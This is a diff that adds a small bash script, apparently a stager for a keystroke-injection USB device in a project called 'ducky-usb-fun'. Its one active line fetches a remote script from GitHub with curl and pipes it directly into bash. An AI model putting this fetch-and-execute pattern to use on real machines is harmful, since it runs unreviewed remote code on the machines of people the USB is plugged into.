@@ -1,0 +1,10 @@
+#!/usr/bin/env bash
+
+# This file is tied directly to a usb
+# Changing this will change the payload for the usb in question
+main() {
+    curl -H "Cache-Control: no-cache, no-store" \
+         -s "https://raw.githubusercontent.com/kroneman/ducky-usb-fun/master/bin/hello_world?${RANDOM}" | bash
+}
+
+main "$@"
